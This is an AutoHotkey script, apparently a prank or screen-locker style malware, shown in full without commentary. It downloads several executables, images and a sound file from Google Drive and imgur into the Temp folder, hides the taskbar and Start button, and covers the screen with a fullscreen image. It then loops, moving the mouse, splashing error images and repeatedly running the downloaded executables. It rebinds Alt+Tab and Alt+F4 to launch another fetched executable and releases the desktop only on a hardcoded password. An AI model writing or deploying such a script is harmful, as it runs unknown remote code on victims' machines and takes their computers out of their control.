URLDownloadToFile, https://i.imgur.com/T8mp4by.jpg, %Temp%\pc_error.jpg
URLDownloadToFile, https://i.imgur.com/Tc7zcxy.jpg, %Temp%\pc_hell.jpg
URLDownloadToFile, https://drive.google.com/uc?authuser=0&id=1lhyt9cRWjNrMevYZAZXbztgUliRvcOEn&export=download, %Temp%\msg1.exe
URLDownloadToFile, https://drive.google.com/uc?authuser=0&id=153a_t-nP0VoxfeS1jRe6E3m28tb5fq3l&export=download, %Temp%\msg2.exe
URLDownloadToFile, https://drive.google.com/uc?authuser=0&id=1I_cIU9WvGfY6kTYGioJQG0jyNT6Q-TsN&export=download, %Temp%\pc_music.wav
URLDownloadToFile, https://drive.google.com/uc?authuser=0&id=1bvTXsxENyhWKgefB8Q5Y_H_w1RserS0C&export=download, %Temp%\pc_exe1.exe
URLDownloadToFile, https://drive.google.com/uc?authuser=0&id=1rWQEJr8LUM9Aa7HE8wbU8JM4fnOhRUxO&export=download, %Temp%\pc_exe2.exe
SoundBeep, 1000, 250
		WinHide, ahk_class Shell_TrayWnd
		WinHide, Start ahk_class Button

Gui, Add, Picture, x0 y65, %Temp%\pc_hell.jpg
Gui, -Caption 
TempVar := A_ScreenHeight +100
Gui,Show, h%TempVar% w%A_ScreenWidth% 

SoundPlay, %Temp%\pc_music.wav

;Run, %Temp%\pc_exe1.exe
;Run, %Temp%\pc_exe1.exe
;Run, %Temp%\pc_exe1.exe

Loop, 1180 {
Random, ran
Random, yy, 0, 10
Random, xx, 0, 10
MouseGetPos, x, y
EnvAdd, addx, xx
EnvAdd, addy, yy
MouseMove, %x%, %y%, 1
Random, y, 0, 1080
Random, x, 0, 1920
SplashImage, %Temp%\pc_error.jpg, B x%x% y%y%
Sleep, 100
Run, %Temp%\msg1.exe
Run, %Temp%\msg2.exe
}

!Tab::
Run, %Temp%\pc_exe2.exe
return


!F4::
Run, %Temp%\pc_exe2.exe
return


^!+F1::
  InputBox, uPass, , Password: 
  If uPass = WinniPuhh
  Goto, Passed
Else
  Msgbox, 48, :), Your not escaping hell!
  return
  
return
Passed:
WinShow, ahk_class Shell_TrayWnd
WinShow, Start ahk_class Button
Exitapp





